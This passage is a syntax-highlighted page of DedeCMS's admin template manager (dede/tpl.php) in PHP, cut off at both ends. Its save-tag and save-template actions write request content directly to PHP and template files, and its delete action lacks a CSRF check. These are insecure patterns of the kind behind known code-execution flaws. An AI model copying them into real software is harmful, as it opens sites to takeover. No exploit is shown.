class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dede/tpl.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 文件管理器</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span>        $Id: tpl.php 1 23:44 2010年7月20日Z tianya $</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@package</span>        DedeCMS.Administrator</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@copyright</span>      Copyright (c) 2007 - 2010, DesDev, Inc.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@license</span>        http://help.dedecms.com/usersguide/license.html</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@link</span>           http://www.dedecms.com</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>).<span class="string">&quot;/config.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">CheckPurview</span>(<span class="string">&#x27;plus_文件管理器&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$action</span> = <span class="keyword">isset</span>(<span class="variable">$action</span>) ? <span class="title function_ invoke__">trim</span>(<span class="variable">$action</span>) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$acdir</span>)) <span class="variable">$acdir</span> = <span class="variable">$cfg_df_style</span>;</span><br><span class="line"><span class="variable">$templetdir</span> = <span class="variable">$cfg_basedir</span>.<span class="variable">$cfg_templets_dir</span>;</span><br><span class="line"><span class="variable">$templetdird</span> = <span class="variable">$templetdir</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$acdir</span>;</span><br><span class="line"><span class="variable">$templeturld</span> = <span class="variable">$cfg_templeturl</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$acdir</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$filename</span>))    <span class="variable">$filename</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$filename</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;#[\/\\\\]#&quot;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$filename</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;#\.#&quot;</span>, <span class="variable">$acdir</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">ShowMsg</span>(<span class="string">&#x27;Not Allow dir &#x27;</span>.<span class="variable">$acdir</span>.<span class="string">&#x27;!&#x27;</span>,<span class="string">&#x27;-1&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">function edit_new_tpl() &#123; &#125;</span></span><br><span class="line"><span class="comment">编辑模板</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span> == <span class="string">&#x27;edit&#x27;</span> || <span class="variable">$action</span> == <span class="string">&#x27;newfile&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$filename</span> == <span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="variable">$action</span> == <span class="string">&#x27;edit&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_ invoke__">ShowMsg</span>(<span class="string">&#x27;未指定要编辑的文件&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$templetdird</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$filename</span>)  &amp;&amp; <span class="variable">$action</span> == <span class="string">&#x27;edit&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$action</span> = <span class="string">&#x27;newfile&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//读取文件内容</span></span><br><span class="line">    <span class="comment">//$content = dede_htmlspecialchars(trim(file_get_contents($truePath.$filename)));</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$action</span> == <span class="string">&#x27;edit&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$templetdird</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$filename</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">        <span class="variable">$content</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$fp</span>, <span class="title function_ invoke__">filesize</span>(<span class="variable">$templetdird</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$filename</span>));</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">        <span class="variable">$content</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;#&lt;textarea#i&quot;</span>, <span class="string">&quot;##textarea&quot;</span>, <span class="variable">$content</span>);</span><br><span class="line">        <span class="variable">$content</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;#&lt;/textarea#i&quot;</span>, <span class="string">&quot;##/textarea&quot;</span>, <span class="variable">$content</span>);</span><br><span class="line">        <span class="variable">$content</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;#&lt;form#i&quot;</span>, <span class="string">&quot;##form&quot;</span>, <span class="variable">$content</span>);</span><br><span class="line">        <span class="variable">$content</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;#&lt;/form#i&quot;</span>, <span class="string">&quot;##/form&quot;</span>, <span class="variable">$content</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$filename</span>)) <span class="variable">$filename</span> = <span class="string">&#x27;newtpl.htm&#x27;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取标签帮助信息</span></span><br><span class="line">    <span class="variable">$helps</span> = <span class="variable">$dtags</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="variable">$tagHelpDir</span> = DEDEINC.<span class="string">&#x27;/taglib/help/&#x27;</span>;</span><br><span class="line">    <span class="variable">$dir</span> = <span class="title function_ invoke__">dir</span>(<span class="variable">$tagHelpDir</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">false</span> !== (<span class="variable">$entry</span> = <span class="variable">$dir</span>-&gt;<span class="title function_ invoke__">read</span>()))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$entry</span> != <span class="string">&#x27;.&#x27;</span> &amp;&amp; <span class="variable">$entry</span> != <span class="string">&#x27;..&#x27;</span> &amp;&amp; !<span class="title function_ invoke__">is_dir</span>(<span class="variable">$tagHelpDir</span>.<span class="variable">$entry</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$dtags</span>[] = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;.txt&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$entry</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$dir</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$dtags</span> <span class="keyword">as</span> <span class="variable">$tag</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//$helpContent = file_get_contents($tagHelpDir.$tag.&#x27;.txt&#x27;);</span></span><br><span class="line">        <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$tagHelpDir</span>.<span class="variable">$tag</span>.<span class="string">&#x27;.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">        <span class="variable">$helpContent</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$fp</span>,<span class="title function_ invoke__">filesize</span>(<span class="variable">$tagHelpDir</span>.<span class="variable">$tag</span>.<span class="string">&#x27;.txt&#x27;</span>));</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">        <span class="variable">$helps</span>[<span class="variable">$tag</span>] = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;&gt;&gt;dede&gt;&gt;&#x27;</span>, <span class="variable">$helpContent</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">make_hash</span>();</span><br><span class="line">    <span class="keyword">include</span> DEDEADMIN.<span class="string">&#x27;/templets/tpl_edit.htm&#x27;</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*---------------------------</span></span><br><span class="line"><span class="comment">function save_tpl() &#123; &#125;</span></span><br><span class="line"><span class="comment">保存编辑模板</span></span><br><span class="line"><span class="comment">--------------------------*/</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$action</span> == <span class="string">&#x27;saveedit&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">csrf_check</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$filename</span> == <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_ invoke__">ShowMsg</span>(<span class="string">&#x27;未指定要编辑的文件或文件名不合法&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;#\.htm$#&quot;</span>, <span class="variable">$filename</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_ invoke__">ShowMsg</span>(<span class="string">&#x27;DEDE模板文件，文件名必须用.htm结尾！&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">stripslashes</span>(<span class="variable">$content</span>);</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/##textarea/i&quot;</span>, <span class="string">&quot;&lt;textarea&quot;</span>, <span class="variable">$content</span>);</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/##\/textarea/i&quot;</span>, <span class="string">&quot;&lt;/textarea&quot;</span>, <span class="variable">$content</span>);</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/##form/i&quot;</span>, <span class="string">&quot;&lt;form&quot;</span>, <span class="variable">$content</span>);</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/##\/form/i&quot;</span>, <span class="string">&quot;&lt;/form&quot;</span>, <span class="variable">$content</span>);</span><br><span class="line">    <span class="variable">$truefile</span> = <span class="variable">$templetdird</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$filename</span>;</span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$truefile</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$content</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">    <span class="title function_ invoke__">ShowMsg</span>(<span class="string">&#x27;成功修改或新建文件&#x27;</span>, <span class="string">&#x27;templets_main.php?acdir=&#x27;</span>.<span class="variable">$acdir</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*---------------------------</span></span><br><span class="line"><span class="comment">function del_tpl() &#123; &#125;</span></span><br><span class="line"><span class="comment">删除模板</span></span><br><span class="line"><span class="comment">--------------------------*/</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$action</span> == <span class="string">&#x27;del&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$truefile</span> = <span class="variable">$templetdird</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">unlink</span>(<span class="variable">$truefile</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_ invoke__">ShowMsg</span>(<span class="string">&#x27;删除文件成功&#x27;</span>,<span class="string">&#x27;templets_main.php?acdir=&#x27;</span>.<span class="variable">$acdir</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_ invoke__">ShowMsg</span>(<span class="string">&#x27;删除文件失败&#x27;</span>,<span class="string">&#x27;-1&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*----------------------</span></span><br><span class="line"><span class="comment">function _upload() &#123;&#125;</span></span><br><span class="line"><span class="comment">上传新模板</span></span><br><span class="line"><span class="comment">-----------------------*/</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$action</span> == <span class="string">&#x27;upload&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>).<span class="string">&#x27;/../include/oxwindow.class.php&#x27;</span>);</span><br><span class="line">    <span class="variable">$acdir</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$acdir</span>);</span><br><span class="line">    <span class="variable">$win</span> = <span class="keyword">new</span> <span class="title class_">OxWindow</span>();</span><br><span class="line">    <span class="title function_ invoke__">make_hash</span>();</span><br><span class="line">    <span class="variable">$win</span>-&gt;<span class="title function_ invoke__">Init</span>(<span class="string">&quot;tpl.php&quot;</span>,<span class="string">&quot;js/blank.js&quot;</span>,<span class="string">&quot;POST&#x27; enctype=&#x27;multipart/form-data&#x27; &quot;</span>);</span><br><span class="line">    <span class="variable">$win</span>-&gt;mainTitle = <span class="string">&quot;模块管理&quot;</span>;</span><br><span class="line">    <span class="variable">$wecome_info</span> = <span class="string">&quot;&lt;a href=&#x27;templets_main.php&#x27;&gt;模板管理&lt;/a&gt; &amp;gt;&amp;gt; 上传模板&quot;</span>;</span><br><span class="line">    <span class="variable">$win</span>-&gt;<span class="title function_ invoke__">AddTitle</span>(<span class="string">&#x27;请选择要上传的文件:&#x27;</span>);</span><br><span class="line">    <span class="variable">$win</span>-&gt;<span class="title function_ invoke__">AddHidden</span>(<span class="string">&quot;action&quot;</span>,<span class="string">&#x27;uploadok&#x27;</span>);</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;</span></span><br><span class="line"><span class="string">    &lt;table width=&#x27;600&#x27; border=&#x27;0&#x27; cellspacing=&#x27;0&#x27; cellpadding=&#x27;0&#x27;&gt;</span></span><br><span class="line"><span class="string">  &lt;tr&gt;</span></span><br><span class="line"><span class="string">    &lt;td width=&#x27;96&#x27; height=&#x27;60&#x27;&gt;请选择文件：&lt;/td&gt;</span></span><br><span class="line"><span class="string">    &lt;td width=&#x27;504&#x27;&gt;</span></span><br><span class="line"><span class="string">        &lt;input name=&#x27;acdir&#x27; type=&#x27;hidden&#x27; value=&#x27;<span class="subst">$acdir</span>&#x27;  /&gt;</span></span><br><span class="line"><span class="string">        &lt;input name=&#x27;token&#x27; type=&#x27;hidden&#x27; value=&#x27;<span class="subst">&#123;$_SESSION[&#x27;token&#x27;]&#125;</span>&#x27;  /&gt;</span></span><br><span class="line"><span class="string">        &lt;input name=&#x27;upfile&#x27; type=&#x27;file&#x27; id=&#x27;upfile&#x27; style=&#x27;width:380px&#x27; /&gt;</span></span><br><span class="line"><span class="string">      &lt;/td&gt;</span></span><br><span class="line"><span class="string">  &lt;/tr&gt;</span></span><br><span class="line"><span class="string"> &lt;/table&gt;</span></span><br><span class="line"><span class="string">    &quot;</span>;</span><br><span class="line">    <span class="variable">$win</span>-&gt;<span class="title function_ invoke__">AddMsgItem</span>(<span class="string">&quot;&lt;div style=&#x27;padding-left:20px;line-height:150%&#x27;&gt;<span class="subst">$msg</span>&lt;/div&gt;&quot;</span>);</span><br><span class="line">    <span class="variable">$winform</span> = <span class="variable">$win</span>-&gt;<span class="title function_ invoke__">GetWindow</span>(<span class="string">&#x27;ok&#x27;</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="variable">$win</span>-&gt;<span class="title function_ invoke__">Display</span>();</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*----------------------</span></span><br><span class="line"><span class="comment">function _upload() &#123;&#125;</span></span><br><span class="line"><span class="comment">上传新模板</span></span><br><span class="line"><span class="comment">-----------------------*/</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$action</span> == <span class="string">&#x27;uploadok&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">csrf_check</span>();</span><br><span class="line">    <span class="keyword">if</span>( !<span class="title function_ invoke__">is_uploaded_file</span>(<span class="variable">$upfile</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_ invoke__">ShowMsg</span>(<span class="string">&quot;貌似你什么都没有上传哦！&quot;</span>,<span class="string">&quot;javascript:;&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>( !<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;#\.(htm|html)$#&quot;</span>, <span class="variable">$upfile_name</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title function_ invoke__">ShowMsg</span>(<span class="string">&quot;DedeCMS模板只能用 .htm 或 .html扩展名！&quot;</span>, <span class="string">&quot;-1&quot;</span>);</span><br><span class="line">          <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>( <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;#[\\\\\/]#&quot;</span>, <span class="variable">$upfile_name</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title function_ invoke__">ShowMsg</span>(<span class="string">&quot;模板文件名有非法字符，禁止上传！&quot;</span>, <span class="string">&quot;-1&quot;</span>);</span><br><span class="line">          <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$upfile</span>, <span class="variable">$templetdird</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$upfile_name</span>);</span><br><span class="line">        @<span class="title function_ invoke__">unlink</span>(<span class="variable">$upfile</span>);</span><br><span class="line">        <span class="title function_ invoke__">ShowMsg</span>(<span class="string">&quot;成功上传一个模板！&quot;</span>,<span class="string">&quot;templets_main.php?acdir=<span class="subst">$acdir</span>&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*---------------------------</span></span><br><span class="line"><span class="comment">function edittag() &#123; &#125;</span></span><br><span class="line"><span class="comment">修改标签碎片</span></span><br><span class="line"><span class="comment">--------------------------*/</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;edittag&#x27;</span> || <span class="variable">$action</span>==<span class="string">&#x27;addnewtag&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;addnewtag&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$democode</span> = <span class="string">&#x27;&lt;&#x27;</span>.<span class="string">&quot;?php</span></span><br><span class="line"><span class="string">if(!defined(&#x27;DEDEINC&#x27;))</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    exit(\&quot;Request Error!\&quot;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">function lib_demotag(&amp;\$ctag,&amp;\$refObj)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    global \$dsql,\$envs;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    //属性处理</span></span><br><span class="line"><span class="string">    \$attlist=\&quot;row|12,titlelen|24\&quot;;</span></span><br><span class="line"><span class="string">    FillAttsDefault(\$ctag-&gt;CAttribute-&gt;Items,\$attlist);</span></span><br><span class="line"><span class="string">    extract(\$ctag-&gt;CAttribute-&gt;Items, EXTR_SKIP);</span></span><br><span class="line"><span class="string">    \$revalue = &#x27;&#x27;;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    //你需编写的代码，不能用echo之类语法，把最终返回值传给\$revalue</span></span><br><span class="line"><span class="string">    //------------------------------------------------------</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    \$revalue = &#x27;Hello Word!&#x27;;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    //------------------------------------------------------</span></span><br><span class="line"><span class="string">    return \$revalue;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&quot;</span>.<span class="string">&#x27;&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;demotag.lib.php&quot;</span>;</span><br><span class="line">        <span class="variable">$title</span> = <span class="string">&quot;新建标签&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;#^[a-z0-9_-]&#123;1,&#125;\.lib\.php$#i&quot;</span>, <span class="variable">$filename</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title function_ invoke__">ShowMsg</span>(<span class="string">&#x27;文件不是标准的标签碎片文件，不允许在此编辑！&#x27;</span>,<span class="string">&#x27;-1&#x27;</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(DEDEINC.<span class="string">&#x27;/taglib/&#x27;</span>.<span class="variable">$filename</span>,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">        <span class="variable">$democode</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$fp</span>, <span class="title function_ invoke__">filesize</span>(DEDEINC.<span class="string">&#x27;/taglib/&#x27;</span>.<span class="variable">$filename</span>));</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">        <span class="variable">$title</span> = <span class="string">&quot;修改标签&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">make_hash</span>();</span><br><span class="line">    <span class="keyword">include</span> DEDEADMIN.<span class="string">&#x27;/templets/tpl_edit_tag.htm&#x27;</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*---------------------------</span></span><br><span class="line"><span class="comment">function savetagfile() &#123; &#125;</span></span><br><span class="line"><span class="comment">保存标签碎片修改</span></span><br><span class="line"><span class="comment">--------------------------*/</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;savetagfile&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">csrf_check</span>();</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;#^[a-z0-9_-]&#123;1,&#125;\.lib\.php$#i&quot;</span>, <span class="variable">$filename</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_ invoke__">ShowMsg</span>(<span class="string">&#x27;文件名不合法，不允许进行操作！&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">require_once</span>(DEDEINC.<span class="string">&#x27;/oxwindow.class.php&#x27;</span>);</span><br><span class="line">    <span class="variable">$tagname</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;#\.lib\.php$#i&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$filename</span>);</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">stripslashes</span>(<span class="variable">$content</span>);</span><br><span class="line">    <span class="variable">$truefile</span> = DEDEINC.<span class="string">&#x27;/taglib/&#x27;</span>.<span class="variable">$filename</span>;</span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$truefile</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$content</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;</span></span><br><span class="line"><span class="string">    &lt;form name=&#x27;form1&#x27; action=&#x27;tag_test_action.php&#x27; target=&#x27;blank&#x27; method=&#x27;post&#x27;&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=&#x27;hidden&#x27; name=&#x27;dopost&#x27; value=&#x27;make&#x27; /&gt;</span></span><br><span class="line"><span class="string">        &lt;b&gt;测试标签：&lt;/b&gt;(需要使用环境变量的不能在此测试)&lt;br/&gt;</span></span><br><span class="line"><span class="string">        &lt;textarea name=&#x27;partcode&#x27; cols=&#x27;150&#x27; rows=&#x27;6&#x27; style=&#x27;width:90%;&#x27;&gt;&#123;dede:<span class="subst">&#123;$tagname&#125;</span> &#125;&#123;/dede:<span class="subst">&#123;$tagname&#125;</span>&#125;&lt;/textarea&gt;&lt;br /&gt;</span></span><br><span class="line"><span class="string">        &lt;input name=&#x27;imageField1&#x27; type=&#x27;image&#x27; class=&#x27;np&#x27; src=&#x27;images/button_ok.gif&#x27; width=&#x27;60&#x27; height=&#x27;22&#x27; border=&#x27;0&#x27; /&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">    &quot;</span>;</span><br><span class="line">    <span class="variable">$wintitle</span> = <span class="string">&quot;成功修改/创建文件！&quot;</span>;</span><br><span class="line">    <span 